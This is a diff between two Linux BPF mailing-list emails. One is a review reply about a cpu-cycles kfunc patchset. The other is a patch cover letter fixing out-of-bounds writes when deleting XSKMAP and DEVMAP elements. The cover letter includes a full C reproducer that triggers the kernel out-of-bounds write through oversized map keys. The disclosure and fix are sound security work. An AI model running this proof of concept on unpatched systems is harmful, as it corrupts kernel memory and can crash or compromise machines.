@@ -1,98 +1,156 @@
-Return-Path: <bpf+bounces-45457-lists+bpf=lfdr.de@vger.kernel.org>
+Return-Path: <bpf+bounces-45459-lists+bpf=lfdr.de@vger.kernel.org>
 X-Original-To: lists+bpf@lfdr.de
 Delivered-To: lists+bpf@lfdr.de
-Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [IPv6:2604:1380:45e3:2400::1])
-	by mail.lfdr.de (Postfix) with ESMTPS id A85379D5E3A
-	for <lists+bpf@lfdr.de>; Fri, 22 Nov 2024 12:34:36 +0100 (CET)
+Received: from sy.mirrors.kernel.org (sy.mirrors.kernel.org [147.75.48.161])
+	by mail.lfdr.de (Postfix) with ESMTPS id C66879D5E97
+	for <lists+bpf@lfdr.de>; Fri, 22 Nov 2024 13:10:49 +0100 (CET)
 Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 6EA9728138A
-	for <lists+bpf@lfdr.de>; Fri, 22 Nov 2024 11:34:35 +0000 (UTC)
+	by sy.mirrors.kernel.org (Postfix) with ESMTPS id 1E3C6B23299
+	for <lists+bpf@lfdr.de>; Fri, 22 Nov 2024 12:10:47 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 3E1281DE2D2;
-	Fri, 22 Nov 2024 11:34:18 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 68E261DE2CB;
+	Fri, 22 Nov 2024 12:10:39 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=infradead.org header.i=@infradead.org header.b="KzdX/m4n"
+	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b="KzRfDZRw"
 X-Original-To: bpf@vger.kernel.org
-Received: from desiato.infradead.org (desiato.infradead.org [90.155.92.199])
+Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.16])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 78B011DDC39
-	for <bpf@vger.kernel.org>; Fri, 22 Nov 2024 11:34:16 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=90.155.92.199
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4169E4500E;
+	Fri, 22 Nov 2024 12:10:37 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=192.198.163.16
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1732275257; cv=none; b=le9JMFZCtz3KU3VwXx1Nt8Iy7XYnvORbvEtquhv+zUx+DBTUuoKCk29hd46CtarCj1AkcLe1IsGJs1EbHwAObDhOM/nzDzmg8KFJlOYBRo2zyQ/l5XLDAY510t/a+Uj4fYtfSdi/Rh9DhgyZkT7/dx6Kj+v39qtszIWf3lxEqMc=
+	t=1732277439; cv=none; b=CImXHC+mMG5r8Et+laBYJDUJyeT3g0GVgMtt5ohDfU2hxttkYsAL/K804NgQwfIgTf1RHUCUc/zQkDhRLw/JNSHTOkmpJ/GsGmPPDx+izBN8xjNMRXlFSp/47LKyz6uxHBViPt3W2BmT2pGj1i78Q4Km7P2yAyi+aeYjnBfk2r4=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1732275257; c=relaxed/simple;
-	bh=CGdFSTpCJdiMMviqvMyvU200vMCiOiab0iSLFJ6Non4=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=BICqNkG7MJQ55tZlTqijq6+npCADlNvfhVoafKagMzZGTzEuapx5yvYXZwlJC7nWAYsGq15fA7wl06An0aEUSw2suSUJSysypCgEmr2fN3OVguVe9qR2UO2lcThEggkvppFBFj4BV9MAqVNOHEXi2nCt2TcbWJIzhNH54T2JGJY=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=infradead.org; spf=none smtp.mailfrom=infradead.org; dkim=pass (2048-bit key) header.d=infradead.org header.i=@infradead.org header.b=KzdX/m4n; arc=none smtp.client-ip=90.155.92.199
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=infradead.org
-Authentication-Results: smtp.subspace.kernel.org; spf=none smtp.mailfrom=infradead.org
-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
-	d=infradead.org; s=desiato.20200630; h=In-Reply-To:Content-Type:MIME-Version:
-	References:Message-ID:Subject:Cc:To:From:Date:Sender:Reply-To:
-	Content-Transfer-Encoding:Content-ID:Content-Description;
-	bh=CGdFSTpCJdiMMviqvMyvU200vMCiOiab0iSLFJ6Non4=; b=KzdX/m4ngNSYfY3kFTWHd+P1Xu
-	wcg0aq25KEUzAgdmGfTKjVSr9XaXyLtO84lYjbWveUnVkCVoV6EQLbr4P33xF6hde0pZO8B+fO6NY
-	zO5jRdooWSq+qI0t6ZfL2pnHtG5VPvmI1m9FVSAAzLIpWNFFZ2qMpDDGgLeQSr8KBaNc304W83YKv
-	0BjXyJ6VuVmkkueag+5kZc2DM/vUCt3W9tPIGoNcgBc3VwKvKOJK+02acL7yqA4zhKLdtenCUHl64
-	wJqUwOm/HagzYjKsxpkdbtuoKQ1WcnjflvXCZLwVUF0hQex5eCOKbv/SiadXtMLYxopHL+pEBxuYc
-	3uMKi3Mw==;
-Received: from j130084.upc-j.chello.nl ([24.132.130.84] helo=noisy.programming.kicks-ass.net)
-	by desiato.infradead.org with esmtpsa (Exim 4.98 #2 (Red Hat Linux))
-	id 1tERvN-00000000hQK-2Um1;
-	Fri, 22 Nov 2024 11:34:09 +0000
-Received: by noisy.programming.kicks-ass.net (Postfix, from userid 1000)
-	id 2A6C830066A; Fri, 22 Nov 2024 12:34:09 +0100 (CET)
-Date: Fri, 22 Nov 2024 12:34:09 +0100
-From: Peter Zijlstra <peterz@infradead.org>
-To: Vadim Fedorenko <vadfed@meta.com>
-Cc: Borislav Petkov <bp@alien8.de>, Alexei Starovoitov <ast@kernel.org>,
-	Daniel Borkmann <daniel@iogearbox.net>,
-	Andrii Nakryiko <andrii@kernel.org>,
-	Eduard Zingerman <eddyz87@gmail.com>,
-	Thomas Gleixner <tglx@linutronix.de>,
-	Yonghong Song <yonghong.song@linux.dev>,
-	Vadim Fedorenko <vadim.fedorenko@linux.dev>,
-	Mykola Lysenko <mykolal@fb.com>, x86@kernel.org,
-	bpf@vger.kernel.org, Martin KaFai Lau <martin.lau@linux.dev>
-Subject: Re: [PATCH bpf-next v8 0/4] bpf: add cpu cycles kfuncss
-Message-ID: <20241122113409.GV24774@noisy.programming.kicks-ass.net>
-References: <20241121000814.3821326-1-vadfed@meta.com>
+	s=arc-20240116; t=1732277439; c=relaxed/simple;
+	bh=L4zavfyLA4o68eATlkOurL6KhT/2AlkjQVk9FqfOUvA=;
+	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version:Content-Type; b=SVtsHcy7J7TJQM2tuvmN2BjC7ScEMYYefdit5ZbEkHzhRwOmiQ1+TI11hmmzAFNWXBBcM/6XAW8WdiHKLtg/UT8KJIf+rfA2cbA6eK2k7HmBA+q6KYAHWl+kTj2M2ItGx91LUn99fzd+/uUvJ/A0U0xbLe2ELrtWib1+NgtJVxs=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com; spf=pass smtp.mailfrom=intel.com; dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b=KzRfDZRw; arc=none smtp.client-ip=192.198.163.16
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
+  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
+  t=1732277437; x=1763813437;
+  h=from:to:cc:subject:date:message-id:mime-version:
+   content-transfer-encoding;
+  bh=L4zavfyLA4o68eATlkOurL6KhT/2AlkjQVk9FqfOUvA=;
+  b=KzRfDZRw3qvD9CfG+zIsDBf6BWvXILu7lZphf6QDe+kuql8sYWM/E0Cs
+   gpJiRxQPzrwUAJRrSJDM9Ki656LInAljqKw8PJvaKfmwlFZe6ngnMsmgl
+   DukcOcWbx9CfOpNGzZpRl2EPCGvmxCW/ERBInr9x4ZicpFJczQJP855tH
+   aNDItOElEovOM3saIcLGE9gzLlHZU6Bvw5awTDpPEXLWY2jGKNj1pwPHG
+   VWWxzVVBIgPI9608ecJHPeYfkc7ejZMmxHxt48pOgV8wp6kVbZthODi+f
+   UvD+YsRQ1FqboWori8JiTL2FlWfwpJKO/Di33QQhvpwEkfwRyb/VINH0Z
+   A==;
+X-CSE-ConnectionGUID: CVorj6bITmS9TbUA+Az9Ew==
+X-CSE-MsgGUID: X/nUF3M7T7SW0F7Y+JjNNQ==
+X-IronPort-AV: E=McAfee;i="6700,10204,11263"; a="20019724"
+X-IronPort-AV: E=Sophos;i="6.12,175,1728975600"; 
+   d="scan'208";a="20019724"
+Received: from fmviesa004.fm.intel.com ([10.60.135.144])
+  by fmvoesa110.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 22 Nov 2024 04:10:37 -0800
+X-CSE-ConnectionGUID: jPI+KXzJTQWsrMcybvrI5A==
+X-CSE-MsgGUID: +Q2skeJrS06n4hPwjMtrPw==
+X-ExtLoop1: 1
+X-IronPort-AV: E=Sophos;i="6.12,175,1728975600"; 
+   d="scan'208";a="95354711"
+Received: from boxer.igk.intel.com ([10.102.20.173])
+  by fmviesa004.fm.intel.com with ESMTP; 22 Nov 2024 04:10:34 -0800
+From: Maciej Fijalkowski <maciej.fijalkowski@intel.com>
+To: bpf@vger.kernel.org,
+	ast@kernel.org,
+	daniel@iogearbox.net,
+	andrii@kernel.org
+Cc: netdev@vger.kernel.org,
+	magnus.karlsson@intel.com,
+	bjorn@kernel.org,
+	maciej.fijalkowski@intel.com,
+	jordyzomer@google.com,
+	security@kernel.org
+Subject: [PATCH v2 bpf 0/2] bpf: fix OOB accesses in map_delete_elem callbacks
+Date: Fri, 22 Nov 2024 13:10:28 +0100
+Message-Id: <20241122121030.716788-1-maciej.fijalkowski@intel.com>
+X-Mailer: git-send-email 2.38.1
 Precedence: bulk
 X-Mailing-List: bpf@vger.kernel.org
 List-Id: <bpf.vger.kernel.org>
 List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <20241121000814.3821326-1-vadfed@meta.com>
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
 
-On Wed, Nov 20, 2024 at 04:08:10PM -0800, Vadim Fedorenko wrote:
-> This patchset adds 2 kfuncs to provide a way to precisely measure the
-> time spent running some code. The first patch provides a way to get cpu
-> cycles counter which is used to feed CLOCK_MONOTONIC_RAW. On x86
-> architecture it is effectively rdtsc_ordered() function while on other
-> architectures it falls back to __arch_get_hw_counter(). The second patch
-> adds a kfunc to convert cpu cycles to nanoseconds using shift/mult
-> constants discovered by kernel. The main use-case for this kfunc is to
-> convert deltas of timestamp counter values into nanoseconds. It is not
-> supposed to get CLOCK_MONOTONIC_RAW values as offset part is skipped.
-> JIT version is done for x86 for now, on other architectures it falls
-> back to slightly simplified version of vdso_calc_ns.
+v1->v2:
+- CC stable and collect tags from Toke & John
 
-So having now read this. I'm still left wondering why you would want to
-do this.
+Hi,
 
-Is this just debug stuff, for when you're doing a poor man's profile
-run? If it is, why do we care about all the precision or the ns. And why
-aren't you using perf?
+Jordy reported that for big enough XSKMAPs and DEVMAPs, when deleting
+elements, OOB writes occur.
 
-Is it something else?
+Reproducer below:
 
-Again, what are you going to do with this information?
+// compile with gcc -o map_poc map_poc.c -lbpf
+#include <errno.h>
+#include <linux/bpf.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <unistd.h>
+
+
+int main() {
+  // Create a large enough BPF XSK map
+  int map_fd;
+  union bpf_attr create_attr = {
+      .map_type = BPF_MAP_TYPE_XSKMAP,
+      .key_size = sizeof(int),
+      .value_size = sizeof(int),
+      .max_entries = 0x80000000 + 2,
+  };
+
+  map_fd = syscall(SYS_bpf, BPF_MAP_CREATE, &create_attr, sizeof(create_attr));
+  if (map_fd < 0) {
+    fprintf(stderr, "Failed to create BPF map: %s\n", strerror(errno));
+    return 1;
+  }
+
+
+  // Delete an element from the map using syscall
+  unsigned int key = 0x80000000 + 1;
+  if (syscall(SYS_bpf, BPF_MAP_DELETE_ELEM,
+              &(union bpf_attr){
+                  .map_fd = map_fd,
+                  .key = &key,
+              },
+              sizeof(union bpf_attr)) < 0) {
+    fprintf(stderr, "Failed to delete element from BPF map: %s\n",
+            strerror(errno));
+    return 1;
+  }
+
+  close(map_fd);
+  return 0;
+}
+
+This tiny series changes data types from int to u32 of keys being used
+for map accesses.
+
+Thanks,
+Maciej
+
+
+Maciej Fijalkowski (2):
+  xsk: fix OOB map writes when deleting elements
+  bpf: fix OOB devmap writes when deleting elements
+
+ kernel/bpf/devmap.c | 6 +++---
+ net/xdp/xskmap.c    | 2 +-
+ 2 files changed, 4 insertions(+), 4 deletions(-)
+
+-- 
+2.34.1
+
 
